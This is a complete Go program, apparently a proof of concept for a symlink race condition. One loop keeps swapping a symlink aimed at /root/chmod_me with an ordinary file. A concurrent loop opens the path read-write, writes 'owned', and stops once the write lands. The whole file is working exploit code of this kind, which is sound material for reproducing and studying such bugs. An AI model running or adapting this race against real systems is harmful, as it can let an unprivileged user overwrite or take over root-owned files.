package main

import (
	"fmt"
	"os"
	"syscall"
)

const (
	testFile    = "symlink_race.test_file"
	testFileTmp = testFile + ".tmp"
)

func renameLoop() {
	// May be left behind from an earlier run
	syscall.Unlink(testFileTmp)

	var err error
	var fd *os.File
	for {
		err = syscall.Symlink("/root/chmod_me", testFileTmp)
		if err != nil {
			fmt.Printf("Symlink() failed: %v\n", err)
			continue
		}
		err = syscall.Rename(testFileTmp, testFile)
		if err != nil {
			fmt.Printf("Rename() 1 failed: %v\n", err)
			continue
		}
		fd, err = os.Create(testFileTmp)
		if err != nil {
			fmt.Printf("Create() failed: %v\n", err)
			continue
		}
		fd.Close()
		err = syscall.Rename(testFileTmp, testFile)
		if err != nil {
			fmt.Printf("Rename() 2 failed: %v\n", err)
			continue
		}
		fmt.Printf(".")
	}
}

func openLoop() {
	var err error
	var f *os.File
	buf := make([]byte, 100)
	owned := []byte("owned")
	var n int
	for {
		f, err = os.OpenFile(testFile, os.O_RDWR, 0777)
		if err != nil {
			fmt.Printf("Open() failed: %v\n", err)
			continue
		}
		_, err = f.Write(owned)
		if err != nil {
			fmt.Printf("Write() failed: %v\n", err)
		}
		n, err = f.Read(buf)
		if err != nil {
			fmt.Printf("Read() failed: %v\n", err)
			continue
		}
		if n > 0 {
			fmt.Printf("Content: %q\n", string(buf[:n]))
			os.Exit(1)
		}
	}
}

func main() {
	go openLoop()
	renameLoop()
}
